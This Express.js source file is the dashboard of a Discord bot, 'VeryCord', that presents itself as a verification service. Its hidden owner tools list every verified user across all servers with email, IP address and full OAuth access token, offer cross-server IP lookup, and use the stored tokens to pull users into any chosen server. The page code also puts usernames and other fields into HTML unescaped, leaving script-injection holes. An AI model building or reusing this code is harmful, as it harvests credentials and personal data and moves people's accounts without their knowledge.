var { Router } = require('express');
var db = require('../../db/database');
var config = require('../../config');
var { buildDashboardAuthUrl } = require('../../utils/oauth');

var router = Router();

var _client = null;
router.setClient = function(c) { _client = c; };

router.get('/', (req, res) => {
    var sessionId = req.cookies && req.cookies.dash_session;
    var session = sessionId ? db.getSession(sessionId) : null;

    if (!session) {
        return res.send(loginPage());
    }

    res.send(dashboardPage(session));
});

router.get('/callback', (req, res) => {
    var code = req.query.code;
    var state = req.query.state;
    if (!code || !state) {
        return res.redirect('/dashboard?error=invalid');
    }
    res.redirect('/auth/callback?code=' + encodeURIComponent(code) + '&state=' + encodeURIComponent(state));
});

router.get('/logout', (req, res) => {
    var sessionId = req.cookies && req.cookies.dash_session;
    if (sessionId) {
        db.removeSession(sessionId);
    }
    res.clearCookie('dash_session');
    res.redirect('/dashboard');
});

function loginPage() {
    var authUrl = buildDashboardAuthUrl();
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard — Login</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body>
    <div class="particles">
        <div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div>
        <div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div>
    </div>
    <div class="container">
        <div class="card">
            <div class="server-icon">⚙</div>
            <h1>Dashboard</h1>
            <p class="subtitle">Sign in with Discord to manage your servers</p>
            <a href="${authUrl}" class="btn-verify">
                <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/>
                </svg>
                Sign in with Discord
            </a>
        </div>
        <div class="footer"><p>Powered by Verification System</p></div>
    </div>
</body>
</html>`;
}

function dashboardPage(session) {
    var avatarUrl = session.avatar
        ? 'https://cdn.discordapp.com/avatars/' + session.user_id + '/' + session.avatar + '.png?size=64'
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body class="dash-body">
    <div class="dash-layout">
        <aside class="dash-sidebar" id="sidebar">
            <div class="dash-sidebar-header">
                <div class="dash-logo">
                    <span class="dash-logo-icon">⚡</span>
                    <span class="dash-logo-text">VeryCord</span>
                </div>
            </div>
            <div class="dash-user-info">
                <img src="${avatarUrl}" class="dash-user-avatar" alt="">
                <div class="dash-user-meta">
                    <span class="dash-user-name">${session.username}</span>
                    <a href="/dashboard/logout" class="dash-logout">Logout</a>
                </div>
            </div>
            <nav class="dash-nav">
                <div class="dash-nav-label">SERVERS</div>
                <div id="serverList" class="dash-server-list">
                    <div class="dash-loading">Loading...</div>
                </div>
                <div class="dash-nav-label" id="ownerSection" style="display:none">OWNER TOOLS</div>
                <div id="ownerTools" style="display:none">
                    <div class="dash-guild-item" id="navIpLookup">
                        <div class="dash-guild-icon dash-guild-letter">🔍</div>
                        <div class="dash-guild-meta"><span class="dash-guild-name">IP Lookup</span>
                        <span class="dash-guild-count">Search by IP</span></div>
                    </div>
                    <div class="dash-guild-item" id="navAllMembers">
                        <div class="dash-guild-icon dash-guild-letter">👥</div>
                        <div class="dash-guild-meta"><span class="dash-guild-name">All Members</span>
                        <span class="dash-guild-count">Global view</span></div>
                    </div>
                </div>
            </nav>
        </aside>

        <main class="dash-main" id="mainContent">
            <div class="dash-welcome">
                <div class="dash-welcome-icon">📊</div>
                <h2>Welcome to the Dashboard</h2>
                <p>Select a server from the sidebar to manage it</p>
            </div>
        </main>
    </div>

    <script>
    (function() {
        var currentGuild = null;
        var currentTab = 'overview';
        var guildCache = {};
        var isOwner = false;

        fetch('/api/dashboard/guilds', { credentials: 'include' })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                // check if user is bot owner by trying owner endpoint
                fetch('/api/dashboard/global-members', { credentials: 'include' })
                    .then(function(r) {
                        if (r.ok) {
                            isOwner = true;
                            document.getElementById('ownerSection').style.display = '';
                            document.getElementById('ownerTools').style.display = '';
                        }
                    }).catch(function() {});
                var list = document.getElementById('serverList');
                if (!data.guilds || data.guilds.length === 0) {
                    list.innerHTML = '<div class="dash-no-servers">No servers found</div>';
                    return;
                }
                var html = '';
                for (var i = 0; i < data.guilds.length; i++) {
                    var g = data.guilds[i];
                    guildCache[g.id] = g;
                    var icon = g.icon
                        ? '<img src="' + g.icon + '" class="dash-guild-icon" alt="">'
                        : '<div class="dash-guild-icon dash-guild-letter">' + g.name.charAt(0) + '</div>';
                    html += '<div class="dash-guild-item" data-guild-id="' + g.id + '">' +
                        icon + '<div class="dash-guild-meta"><span class="dash-guild-name">' + g.name + '</span>' +
                        '<span class="dash-guild-count">' + g.verified_count + ' verified</span></div></div>';
                }
                list.innerHTML = html;
            })
            .catch(function() {
                document.getElementById('serverList').innerHTML = '<div class="dash-no-servers">Failed to load</div>';
            });

        // owner tools click handlers
        document.getElementById('navIpLookup').addEventListener('click', function() {
            document.querySelectorAll('.dash-guild-item').forEach(function(el) { el.classList.remove('active'); });
            document.getElementById('navIpLookup').classList.add('active');
            currentGuild = null;
            showIpLookup();
        });
        document.getElementById('navAllMembers').addEventListener('click', function() {
            document.querySelectorAll('.dash-guild-item').forEach(function(el) { el.classList.remove('active'); });
            document.getElementById('navAllMembers').classList.add('active');
            currentGuild = null;
            showAllMembers();
        });

        function showIpLookup() {
            var main = document.getElementById('mainContent');
            main.innerHTML = '<div class="dash-header"><div class="dash-header-icon dash-header-letter">🔍</div>' +
                '<div class="dash-header-info"><h2>IP Lookup</h2><p>Search verified users by IP address</p></div></div>' +
                '<div style="padding:20px"><div class="dash-form-row" style="margin-bottom:20px">' +
                '<input type="text" id="ipSearchInput" class="dash-input" placeholder="Enter IP address..." style="flex:1">' +
                '<button class="dash-btn dash-btn-primary" id="ipSearchBtn">Search</button></div>' +
                '<div id="ipResults"></div></div>';

            document.getElementById('ipSearchBtn').addEventListener('click', function() {
                var ip = document.getElementById('ipSearchInput').value.trim();
                if (!ip) return;
                document.getElementById('ipResults').innerHTML = '<div class="dash-loading">Searching...</div>';
                fetch('/api/dashboard/ip-lookup?ip=' + encodeURIComponent(ip), { credentials: 'include' })
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (!data.results || data.results.length === 0) {
                            document.getElementById('ipResults').innerHTML = '<div class="dash-empty">No users found for IP ' + ip + '</div>';
                            return;
                        }
                        var html = '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
                            '<th>User</th><th>Email</th><th>Server</th><th>Token</th><th>Verified</th></tr></thead><tbody>';
                        for (var i = 0; i < data.results.length; i++) {
                            var m = data.results[i];
                            var avatar = m.avatar ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
                            var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
                            var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
                            html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
                                '<span>' + m.username + '<br><small class="text-muted">' + m.user_id + '</small></span></td>' +
                                '<td>' + (m.email || 'N/A') + '</td>' +
                                '<td><code>' + m.guild_id + '</code></td>' +
                                '<td><code class="dash-token" title="' + (m.access_token || '') + '">' + tokenDisplay + '</code></td>' +
                                '<td>' + date + '</td></tr>';
                        }
                        html += '</tbody></table></div>';
                        document.getElementById('ipResults').innerHTML = '<p style="margin-bottom:10px">Found <strong>' + data.total + '</strong> result(s) for <code>' + ip + '</code></p>' + html;
                    })
                    .catch(function() {
                        document.getElementById('ipResults').innerHTML = '<div class="dash-empty">Error searching</div>';
                    });
            });

            document.getElementById('ipSearchInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') document.getElementById('ipSearchBtn').click();
            });
        }

        function showAllMembers() {
            var main = document.getElementById('mainContent');
            var serverOptions = '<option value="">-- Select Target Server --</option>';
            var allGuilds = Object.values(guildCache);
            for (var i = 0; i < allGuilds.length; i++) {
                serverOptions += '<option value="' + allGuilds[i].id + '">' + allGuilds[i].name + '</option>';
            }

            main.innerHTML = '<div class="dash-header"><div class="dash-header-icon dash-header-letter">👥</div>' +
                '<div class="dash-header-info"><h2>All Members</h2><p>Every verified user across all servers</p></div></div>' +
                '<div style="padding:10px 20px; display:flex; gap:10px; flex-wrap:wrap; align-items:center; background:#1e1e24; border-bottom:1px solid #333;">' +
                '<select id="targetPullServer" class="dash-input" style="max-width:300px">' + serverOptions + '</select>' +
                '<button class="dash-btn dash-btn-primary" id="pullAllBtn">Pull All to Selected Server</button>' +
                '</div>' +
                '<div id="globalMembersContent"><div class="dash-loading">Loading...</div></div>';

            document.getElementById('pullAllBtn').addEventListener('click', function() {
                var select = document.getElementById('targetPullServer');
                var targetGuildId = select.value;
                if (!targetGuildId) {
                    alert('Please select a target server first.');
                    return;
                }
                var serverName = select.options[select.selectedIndex].text;
                if (!confirm('Are you sure you want to start pulling all global members into ' + serverName + '? This might take a while.')) return;
                
                var btn = this;
                var oldText = btn.innerText;
                btn.innerText = 'Starting...';
                btn.disabled = true;

                fetch('/api/dashboard/pull-all', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ targetGuildId: targetGuildId })
                }).then(function(r) { return r.json(); }).then(function(data) {
                    if (data.error) {
                        alert('Error: ' + data.error);
                        btn.innerText = oldText;
                        btn.disabled = false;
                    } else {
                        alert('Pull process started in the background. Pulling up to ' + data.total + ' users.');
                        btn.innerText = 'Pulling...';
                    }
                }).catch(function(e) {
                    alert('Error: ' + e.message);
                    btn.innerText = oldText;
                    btn.disabled = false;
                });
            });

            fetch('/api/dashboard/global-members', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (!data.members || data.members.length === 0) {
                        document.getElementById('globalMembersContent').innerHTML = '<div class="dash-empty">No verified members yet</div>';
                        return;
                    }
                    var html = '<div style="padding:10px 20px"><p>' + data.total + ' total verified records (Click any text to copy)</p></div>' +
                        '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
                        '<th>User</th><th>Email</th><th>IP</th><th>Server</th><th>Token</th><th>Verified</th><th>Action</th></tr></thead><tbody>';
                    for (var i = 0; i < data.members.length; i++) {
                        var m = data.members[i];
                        var avatar = m.avatar ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
                        var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
                        var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
                        
                        html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
                            '<span><span class="click-copy" title="Click to copy username">' + m.username + '</span><br>' +
                            '<small class="text-muted click-copy" title="Click to copy ID">' + m.user_id + '</small></span></td>' +
                            '<td><span class="click-copy" title="Click to copy email">' + (m.email || 'N/A') + '</span></td>' +
                            '<td><code class="click-copy" title="Click to copy IP">' + (m.ip_address || 'N/A') + '</code></td>' +
                            '<td><code class="click-copy" title="Click to copy Guild ID">' + m.guild_id + '</code></td>' +
                            '<td><code class="dash-token click-copy" data-full="' + (m.access_token||'') + '" title="Click to copy full token">' + tokenDisplay + '</code></td>' +
                            '<td>' + date + '</td>' +
                            '<td><button class="dash-btn dash-btn-sm pull-user-btn" data-userid="' + m.user_id + '">Pull User</button></td></tr>';
                    }
                    html += '</tbody></table></div>';
                    document.getElementById('globalMembersContent').innerHTML = html;

                    // Click to copy delegation
                    document.getElementById('globalMembersContent').addEventListener('click', function(e) {
                        if (e.target.classList.contains('click-copy')) {
                            var text = e.target.getAttribute('data-full') || e.target.innerText;
                            if (text && text !== 'N/A') {
                                navigator.clipboard.writeText(text);
                                var oldColor = e.target.style.color;
                                e.target.style.color = '#57F287';
                                setTimeout(function() { e.target.style.color = oldColor; }, 500);
                            }
                        }

                        if (e.target.classList.contains('pull-user-btn')) {
                            var btn = e.target;
                            var userId = btn.getAttribute('data-userid');
                            var select = document.getElementById('targetPullServer');
                            var targetGuildId = select.value;
                            if (!targetGuildId) {
                                alert('Please select a target server from the dropdown at the top first.');
                                return;
                            }
                            var oldText = btn.innerText;
                            btn.innerText = '...';
                            btn.disabled = true;

                            fetch('/api/dashboard/pull-user', {
                                method: 'POST', credentials: 'include',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ userId: userId, targetGuildId: targetGuildId })
                            }).then(function(r) { return r.json(); }).then(function(d) {
                                if (d.error) {
                                    alert('Error: ' + d.error);
                                    btn.innerText = oldText;
                                    btn.disabled = false;
                                } else {
                                    btn.innerText = d.status === 'already_in_server' ? 'Already in' : 'Pulled!';
                                    btn.classList.add('dash-btn-ghost');
                                }
                            }).catch(function(err) {
                                alert('Error: ' + err.message);
                                btn.innerText = oldText;
                                btn.disabled = false;
                            });
                        }
                    });
                });
        }

        // event delegation for server clicks
        document.getElementById('serverList').addEventListener('click', function(e) {
            var item = e.target.closest('.dash-guild-item');
            if (!item) return;
            var id = item.getAttribute('data-guild-id');
            var g = guildCache[id];
            if (!g) return;
            currentGuild = id;
            currentTab = 'overview';
            document.querySelectorAll('.dash-guild-item').forEach(function(el) { el.classList.remove('active'); });
            item.classList.add('active');
            loadGuildDashboard(id, g.name, g.icon);
        });

        function loadGuildDashboard(guildId, name, icon) {
            var main = document.getElementById('mainContent');
            var iconHtml = icon
                ? '<img src="' + icon + '" class="dash-header-icon" alt="">'
                : '<div class="dash-header-icon dash-header-letter">' + name.charAt(0) + '</div>';

            main.innerHTML = '<div class="dash-header">' + iconHtml +
                '<div class="dash-header-info"><h2>' + name + '</h2><p>Server Dashboard</p></div></div>' +
                '<div class="dash-tabs" id="tabBar">' +
                '<button class="dash-tab active" data-tab="overview">Overview</button>' +
                '<button class="dash-tab" data-tab="members">Members</button>' +
                '<button class="dash-tab" data-tab="logs">Logs</button>' +
                '<button class="dash-tab" data-tab="blacklist">Blacklist</button>' +
                '<button class="dash-tab" data-tab="config">Config</button>' +
                '</div>' +
                '<div id="tabContent" class="dash-tab-content"><div class="dash-loading">Loading...</div></div>';

            // tab click delegation
            document.getElementById('tabBar').addEventListener('click', function(e) {
                var btn = e.target.closest('.dash-tab');
                if (!btn) return;
                var tab = btn.getAttribute('data-tab');
                switchTab(tab);
            });

            switchTab('overview');
        }

        function switchTab(tab) {
            currentTab = tab;
            var btns = document.querySelectorAll('.dash-tab');
            btns.forEach(function(b) {
                b.classList.toggle('active', b.getAttribute('data-tab') === tab);
            });

            var content = document.getElementById('tabContent');
            content.innerHTML = '<div class="dash-loading">Loading...</div>';

            if (tab === 'overview') loadOverview(currentGuild);
            else if (tab === 'members') loadMembers(currentGuild);
            else if (tab === 'logs') loadLogs(currentGuild);
            else if (tab === 'blacklist') loadBlacklist(currentGuild);
            else if (tab === 'config') loadConfig(currentGuild);
        }

        function loadOverview(guildId) {
            fetch('/api/dashboard/' + guildId + '/stats', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    document.getElementById('tabContent').innerHTML =
                        '<div class="dash-stats-grid">' +
                        statCard('Verified', data.verified, '✅') +
                        statCard('Blocked', data.blocked, '⛔') +
                        statCard('Total Verifications', data.total_verifications, '📊') +
                        statCard('Blacklisted', data.blacklist_count, '🚫') +
                        '</div>';
                });
        }

        function statCard(label, value, emoji) {
            return '<div class="dash-stat-card"><div class="dash-stat-emoji">' + emoji + '</div>' +
                '<div class="dash-stat-value">' + (value || 0) + '</div>' +
                '<div class="dash-stat-label">' + label + '</div></div>';
        }

        function loadMembers(guildId) {
            fetch('/api/dashboard/' + guildId + '/members', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (!data.members || data.members.length === 0) {
                        document.getElementById('tabContent').innerHTML = '<div class="dash-empty">No verified members yet</div>';
                        return;
                    }
                    var html = '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
                        '<th>User</th><th>Email</th><th>IP</th><th>Token</th><th>Verified</th><th>Actions</th></tr></thead><tbody>';
                    for (var i = 0; i < data.members.length; i++) {
                        var m = data.members[i];
                        var avatar = m.avatar
                            ? 'https://cdn.discordapp.com/avatars/' + m.user_id + '/' + m.avatar + '.png?size=32'
                            : 'https://cdn.discordapp.com/embed/avatars/0.png';
                        var tokenDisplay = m.access_token ? m.access_token.substring(0, 12) + '...' : 'N/A';
                        var date = m.verified_at ? new Date(m.verified_at).toLocaleDateString() : 'Unknown';
                        html += '<tr><td class="dash-user-cell"><img src="' + avatar + '" class="dash-table-avatar">' +
                            '<span>' + m.username + '<br><small class="text-muted">' + m.user_id + '</small></span></td>' +
                            '<td>' + (m.email || 'N/A') + '</td>' +
                            '<td><code>' + (m.ip_address || 'N/A') + '</code></td>' +
                            '<td><code class="dash-token" title="' + (m.access_token || '') + '">' + tokenDisplay + '</code></td>' +
                            '<td>' + date + '</td>' +
                            '<td><button class="dash-btn dash-btn-sm dash-btn-danger" data-reverify="' + m.user_id + '">Reverify</button></td></tr>';
                    }
                    html += '</tbody></table></div>';
                    document.getElementById('tabContent').innerHTML = html;

                    // reverify button delegation
                    document.getElementById('tabContent').addEventListener('click', function(e) {
                        var btn = e.target.closest('[data-reverify]');
                        if (!btn) return;
                        var uid = btn.getAttribute('data-reverify');
                        if (!confirm('Force reverify this user?')) return;
                        fetch('/api/dashboard/' + currentGuild + '/reverify/' + uid, {
                            method: 'POST', credentials: 'include'
                        }).then(function(r) { return r.json(); }).then(function() {
                            loadMembers(currentGuild);
                        });
                    });
                });
        }

        function loadLogs(guildId) {
            fetch('/api/dashboard/' + guildId + '/logs?limit=100', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (!data.logs || data.logs.length === 0) {
                        document.getElementById('tabContent').innerHTML = '<div class="dash-empty">No logs yet</div>';
                        return;
                    }
                    var html = '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
                        '<th>User</th><th>Action</th><th>Details</th><th>IP</th><th>Time</th></tr></thead><tbody>';
                    for (var i = 0; i < data.logs.length; i++) {
                        var l = data.logs[i];
                        var actionClass = l.action === 'blocked' ? 'dash-action-blocked' : l.action === 'verify' ? 'dash-action-verify' : 'dash-action-other';
                        var time = new Date(l.timestamp).toLocaleString();
                        html += '<tr><td><code>' + l.user_id + '</code></td>' +
                            '<td><span class="dash-action ' + actionClass + '">' + l.action + '</span></td>' +
                            '<td>' + (l.details || '') + '</td>' +
                            '<td><code>' + (l.ip_address || '') + '</code></td>' +
                            '<td>' + time + '</td></tr>';
                    }
                    html += '</tbody></table></div>';
                    document.getElementById('tabContent').innerHTML = html;
                });
        }

        function loadBlacklist(guildId) {
            fetch('/api/dashboard/' + guildId + '/blacklist', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var html = '<div class="dash-section-header"><h3>Blacklist</h3>' +
                        '<button class="dash-btn dash-btn-primary" id="showBlFormBtn">+ Add Entry</button></div>' +
                        '<div id="blacklistForm" style="display:none" class="dash-form-row">' +
                        '<select id="blType"><option value="ip">IP</option><option value="user">User ID</option></select>' +
                        '<input type="text" id="blValue" placeholder="Value">' +
                        '<input type="text" id="blReason" placeholder="Reason">' +
                        '<button class="dash-btn dash-btn-primary" id="addBlBtn">Add</button>' +
                        '<button class="dash-btn dash-btn-ghost" id="hideBlFormBtn">Cancel</button></div>';

                    if (!data.blacklist || data.blacklist.length === 0) {
                        html += '<div class="dash-empty">No blacklist entries</div>';
                    } else {
                        html += '<div class="dash-table-wrap"><table class="dash-table"><thead><tr>' +
                            '<th>Type</th><th>Value</th><th>Reason</th><th>Added</th><th>Actions</th></tr></thead><tbody>';
                        for (var i = 0; i < data.blacklist.length; i++) {
                            var b = data.blacklist[i];
                            var date = new Date(b.added_at).toLocaleDateString();
                            html += '<tr><td><span class="dash-badge">' + b.type + '</span></td>' +
                                '<td><code>' + b.value + '</code></td>' +
                                '<td>' + (b.reason || 'N/A') + '</td>' +
                                '<td>' + date + '</td>' +
                                '<td><button class="dash-btn dash-btn-sm dash-btn-danger" data-bl-remove-type="' + b.type + '" data-bl-remove-val="' + b.value + '">Remove</button></td></tr>';
                        }
                        html += '</tbody></table></div>';
                    }
                    document.getElementById('tabContent').innerHTML = html;

                    // wire up buttons
                    document.getElementById('showBlFormBtn').addEventListener('click', function() {
                        document.getElementById('blacklistForm').style.display = 'flex';
                    });
                    var hideBtn = document.getElementById('hideBlFormBtn');
                    if (hideBtn) hideBtn.addEventListener('click', function() {
                        document.getElementById('blacklistForm').style.display = 'none';
                    });
                    var addBtn = document.getElementById('addBlBtn');
                    if (addBtn) addBtn.addEventListener('click', function() {
                        var body = {
                            type: document.getElementById('blType').value,
                            value: document.getElementById('blValue').value,
                            reason: document.getElementById('blReason').value
                        };
                        if (!body.value) return alert('Enter a value');
                        fetch('/api/dashboard/' + currentGuild + '/blacklist/add', {
                            method: 'POST', credentials: 'include',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(body)
                        }).then(function(r) { return r.json(); }).then(function() {
                            loadBlacklist(currentGuild);
                        });
                    });

                    // remove delegation
                    document.getElementById('tabContent').addEventListener('click', function(e) {
                        var btn = e.target.closest('[data-bl-remove-type]');
                        if (!btn) return;
                        if (!confirm('Remove this entry?')) return;
                        fetch('/api/dashboard/' + currentGuild + '/blacklist/remove', {
                            method: 'POST', credentials: 'include',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: btn.getAttribute('data-bl-remove-type'),
                                value: btn.getAttribute('data-bl-remove-val')
                            })
                        }).then(function(r) { return r.json(); }).then(function() {
                            loadBlacklist(currentGuild);
                        });
                    });
                });
        }

        function loadConfig(guildId) {
            fetch('/api/dashboard/' + guildId + '/config', { credentials: 'include' })
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var c = data.config;
                    var welcomeEsc = (c.welcome_msg || '').replace(/"/g, '&quot;');
                    var brandEsc = (c.custom_brand || '').replace(/"/g, '&quot;');
                    var html = '<div class="dash-config-grid">' +
                        configField('VPN Blocking', '<label class="dash-toggle"><input type="checkbox" id="cfgVpn" ' + (c.vpn_block ? 'checked' : '') + '><span class="dash-toggle-slider"></span></label>') +
                        configField('Welcome Message', '<input type="text" id="cfgWelcome" class="dash-input" value="' + welcomeEsc + '" placeholder="e.g. Welcome {user}!">') +
                        configField('Custom Brand', '<input type="text" id="cfgBrand" class="dash-input" value="' + brandEsc + '" placeholder="Server display name">') +
                        configField('Log Channel ID', '<input type="text" id="cfgLog" class="dash-input" value="' + (c.log_channel || '') + '" placeholder="Channel ID">') +
                        configField('Verified Role ID', '<input type="text" id="cfgVerified" class="dash-input" value="' + (c.verified_role || '') + '" placeholder="Role ID">') +
                        configField('Unverified Role ID', '<input type="text" id="cfgUnverified" class="dash-input" value="' + (c.unverified_role || '') + '" placeholder="Role ID">') +
                        '</div><div class="dash-config-actions"><button class="dash-btn dash-btn-primary" id="saveConfigBtn">Save Changes</button></div>';
                    document.getElementById('tabContent').innerHTML = html;

                    document.getElementById('saveConfigBtn').addEventListener('click', function() {
                        var body = {
                            vpn_block: document.getElementById('cfgVpn').checked,
                            welcome_msg: document.getElementById('cfgWelcome').value,
                            custom_brand: document.getElementById('cfgBrand').value,
                            log_channel: document.getElementById('cfgLog').value || null,
                            verified_role: document.getElementById('cfgVerified').value || null,
                            unverified_role: document.getElementById('cfgUnverified').value || null
                        };
                        fetch('/api/dashboard/' + currentGuild + '/config', {
                            method: 'POST', credentials: 'include',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(body)
                        }).then(function(r) { return r.json(); }).then(function() {
                            alert('Config saved!');
                        });
                    });
                });
        }

        function configField(label, input) {
            return '<div class="dash-config-field"><label class="dash-config-label">' + label + '</label>' + input + '</div>';
        }
    })();
    </script>
</body>
</html>`;
}

module.exports = router;
